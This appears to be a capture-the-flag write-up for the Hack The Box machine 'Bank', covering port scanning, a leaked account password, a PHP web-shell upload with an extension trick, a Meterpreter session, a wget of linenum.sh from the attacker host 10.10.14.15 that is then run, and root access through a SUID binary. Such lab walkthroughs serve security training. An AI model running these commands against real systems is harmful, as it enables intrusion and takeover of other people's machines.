@@ -1,0 +1,155 @@
+<h1>Bank 10.10.10.29</h1>
+
+If we add bank.htb to our /etc/hosts file and attempt to browse to it,
+we are presented with a login page.
+
+<h2>NMAP</h2>
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+  | ssh-hostkey:
+  |   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
+  |   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
+  |   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
+  |_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (EdDSA)
+  53/tcp open  domain
+  | dns-nsid:
+  |_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
+  80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+  | http-methods:
+  |_  Supported Methods: POST OPTIONS GET HEAD
+  |_http-server-header: Apache/2.4.7 (Ubuntu)
+  |_http-title: Apache2 Ubuntu Default Page: It worksServices
+
+  Services
+
+  host         port  proto  name    state  info
+  ----         ----  -----  ----    -----  ----
+  10.10.10.29  22    tcp    ssh     open   OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 Ubuntu Linux; protocol 2.0
+  10.10.10.29  53    tcp    domain  open
+  10.10.10.29  80    tcp    http    open   Apache httpd 2.4.7 (Ubuntu)
+
+  |_http-server-header: Apache/2.4.7 (Ubuntu)
+  | vulners:
+  |   cpe:/a:apache:http_server:2.4.7:
+  | 	CVE-2014-0226		6.8		https://vulners.com/cve/CVE-2014-0226
+  | 	CVE-2017-9788		6.4		https://vulners.com/cve/CVE-2017-9788
+  | 	CVE-2016-8743		5.0		https://vulners.com/cve/CVE-2016-8743
+  | 	CVE-2016-0736		5.0		https://vulners.com/cve/CVE-2016-0736
+  | 	CVE-2016-2161		5.0		https://vulners.com/cve/CVE-2016-2161
+  | 	CVE-2014-3523		5.0		https://vulners.com/cve/CVE-2014-3523
+  | 	CVE-2014-0231		5.0		https://vulners.com/cve/CVE-2014-0231
+  | 	CVE-2017-9798		5.0		https://vulners.com/cve/CVE-2017-9798
+  | 	CVE-2014-0098		5.0		https://vulners.com/cve/CVE-2014-0098
+  | 	CVE-2013-6438		5.0		https://vulners.com/cve/CVE-2013-6438
+  | 	CVE-2014-8109		4.3		https://vulners.com/cve/CVE-2014-8109
+  | 	CVE-2014-0118		4.3		https://vulners.com/cve/CVE-2014-0118
+  | 	CVE-2015-3185		4.3		https://vulners.com/cve/CVE-2015-3185
+  |_	CVE-2014-0117		4.3		https://vulners.com/cve/CVE-2014-0117
+
+
+<h2>Dirbuster</h2>
+
+
+
+<h2>Exploitation 1</h2>
+  While this was the intended method, many people overlooked it due to support.php
+  being visible almost immediately when scanning. The /balance-transfer/
+  directory took some time to find but is the intended method.
+
+  If you look through the files, they are all encrypted at first glance.
+  If you take a closer look, there is one file which is much smaller than the rest:
+  http://bank.htb/balance-transfer/
+  ...
+  [ ]	56215edb6917e27802904037da00a977.acc	2017-06-15 09:50 	584
+  [ ]	59829e0910101366d704a85f11cfdd15.acc	2017-06-15 09:50 	584
+  [ ]	66284d79b5caa9e6a3dd440607b3fdd7.acc	2017-06-15 09:50 	584
+  [ ]	68576f20e9732f1b2edc4df5b8533230.acc	2017-06-15 09:50 	257 	 <<<<
+  [ ]	75942bd27ec22afd9bdc8826cc454c75.acc	2017-06-15 09:50 	584
+  [ ]	76123b5b589514bc2cb1c6adfb937d13.acc	2017-06-15 09:50 	584
+  [ ]	80416d8aaea6d6cf3dcec95780fda17d.acc	2017-06-15 09:50 	585
+  [ ]	85006f1266226e84efb919908d5f8333.acc	2017-06-15 09:50 	583
+  ...
+  http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
+    --ERR ENCRYPT FAILED
+    +=================+
+    | HTB Bank Report |
+    +=================+
+
+    ===UserAccount===
+    Full Name: Christos Christopoulos
+    Email: chris@bank.htb
+    Password: !##HTBB4nkP4ssw0rd!##
+    CreditCards: 5
+    Transactions: 39
+    Balance: 8842803 .
+    ===UserAccount===
+
+  Login and upload malicious php file at support.php
+  Rename the php file to htb ie shell4441.HTB
+  Remember to setup listener / exploit/multi/handler first!
+
+  cd /home/chris
+    Listing: /home/chris
+    ====================
+
+    Mode              Size  Type  Last modified              Name
+    ----              ----  ----  -------------              ----
+    100600/rw-------  2     fil   2017-06-15 08:50:52 +0200  .bash_history
+    100644/rw-r--r--  220   fil   2017-05-28 21:13:11 +0200  .bash_logout
+    100644/rw-r--r--  3637  fil   2017-05-28 21:13:11 +0200  .bashrc
+    40700/rwx------   4096  dir   2017-05-28 21:14:35 +0200  .cache
+    100644/rw-r--r--  675   fil   2017-05-28 21:13:11 +0200  .profile
+    100664/rw-rw-r--  33    fil   2017-05-29 13:52:36 +0200  user.txt
+
+    meterpreter > cat user.txt
+  cd /tmp
+  wget 10.10.14.15/linenum.sh
+  chmod +x linenum.sh
+  ./linenum.sh -t
+
+<h2>LinEnum</h2>
+  ...
+  SUID files:
+  -rwsr-xr-x 1 root root 112204 Jun 14 18:27 /var/htb/bin/emergency
+  -rwsr-xr-x 1 root root 5480 Mar 27 18:34 /usr/lib/eject/dmcrypt-get-device
+  -rwsr-xr-x 1 root root 492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign
+  -rwsr-xr-- 1 root messagebus 333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+  -rwsr-xr-x 1 root root 9808 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
+  -rwsr-sr-x 1 daemon daemon 46652 Oct 21  2013 /usr/bin/at
+  -rwsr-xr-x 1 root root 35916 May 17 02:38 /usr/bin/chsh
+  -rwsr-xr-x 1 root root 45420 May 17 02:38 /usr/bin/passwd
+  -rwsr-xr-x 1 root root 44620 May 17 02:38 /usr/bin/chfn
+  -rwsr-xr-x 1 root root 18168 Nov 24  2015 /usr/bin/pkexec
+  -rwsr-xr-x 1 root root 30984 May 17 02:38 /usr/bin/newgrp
+  -rwsr-xr-x 1 root root 18136 May  8  2014 /usr/bin/traceroute6.iputils
+  -rwsr-xr-x 1 root root 66284 May 17 02:38 /usr/bin/gpasswd
+  -rwsr-xr-x 1 root root 156708 May 29 13:19 /usr/bin/sudo
+  -rwsr-xr-x 1 root root 72860 Oct 21  2013 /usr/bin/mtr
+  -rwsr-sr-x 1 libuuid libuuid 17996 Nov 24  2016 /usr/sbin/uuidd
+  -rwsr-xr-- 1 root dip 323000 Apr 21  2015 /usr/sbin/pppd
+  -rwsr-xr-x 1 root root 38932 May  8  2014 /bin/ping
+  -rwsr-xr-x 1 root root 43316 May  8  2014 /bin/ping6
+  -rwsr-xr-x 1 root root 35300 May 17 02:38 /bin/su
+  -rwsr-xr-x 1 root root 30112 May 15  2015 /bin/fusermount
+  -rwsr-xr-x 1 root root 88752 Nov 24  2016 /bin/mount
+  -rwsr-xr-x 1 root root 67704 Nov 24  2016 /bin/umount
+
+  First thing on the SUID list is /var/htb/bin/emergency and that looks pretty damn suspicious.
+  Attempting to run it over nc seemingly does nothing,
+  so let's get a semi-interactive pty with the good ol'
+  python -c 'import pty; pty.spawn("/bin/bash")'
+
+  If we run it now, we get something! Looks like it spawns a shell for us
+  and we just happen to be in the root group.
+
+  www-data@bank:/var/htb/bin$ ./emergency
+  ./emergency
+  # pwd
+  pwd
+  /var/htb/bin
+  # whoami
+  whoami
+  root
+  # cat /root/root.txt
+  cat /root/root.txt
+  d5be56adc67b488f81a4b9de30c8a68e
